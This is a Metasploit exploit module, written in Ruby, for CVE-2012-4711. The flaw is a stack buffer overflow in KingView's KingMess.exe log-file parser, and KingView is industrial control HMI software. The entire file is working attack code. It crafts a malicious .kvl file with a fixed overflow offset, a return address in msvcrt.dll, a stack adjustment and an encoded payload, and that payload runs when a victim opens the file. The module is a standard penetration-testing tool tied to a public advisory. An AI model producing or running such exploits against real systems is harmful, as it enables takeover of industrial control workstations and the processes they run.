##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      'Name'           => "KingView Log File Parsing Buffer Overflow",
      'Description'    => %q{
          This module exploits a vulnerability found in KingView <= 6.55. It exists in
        the KingMess.exe application when handling log files, due to the insecure usage of
        sprintf. This module uses a malformed .kvl file which must be opened by the victim
        via the KingMess.exe application, through the 'Browse Log Files' option. The module
        has been tested successfully on KingView 6.52 and KingView 6.53 Free Trial over
        Windows XP SP3.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Lucas Apa', # Vulnerability discovery
          'Carlos Mario Penagos Hollman', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2012-4711'],
          ['OSVDB', '89690'],
          ['BID', '57909'],
          ['URL', 'http://ics-cert.us-cert.gov/pdf/ICSA-13-043-02.pdf']
        ],
      'Payload'        =>
        {
          'Space'          => 1408,
          'DisableNops'    => true,
          'BadChars'       => "\x00\x0a\x0d",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'KingView 6.52 English / KingView 6.53 Free Trial / Kingmess.exe 65.20.2003.10300 / Windows XP SP3',
            {
              'Offset' => 295,
              'Ret'    => 0x77c35459 # push esp # ret # msvcrt.dll
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 20 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The filename', 'msf.kvl'])
      ], self.class)
  end

  def exploit
    version = "6.00"
    version << "\x00" * (0x90 - version.length)
    entry = "\xdd\x07\x03\x00\x03\x00\x0d\x00\x0c\x00\x31\x00\x38\x00\xd4\x01"
    entry << rand_text_alpha(target['Offset'])
    entry << [target.ret].pack("V")
    entry << rand_text_alpha(16)
    entry << payload.encoded

    kvl_file = version
    kvl_file << entry

    file_create(kvl_file)
  end
end
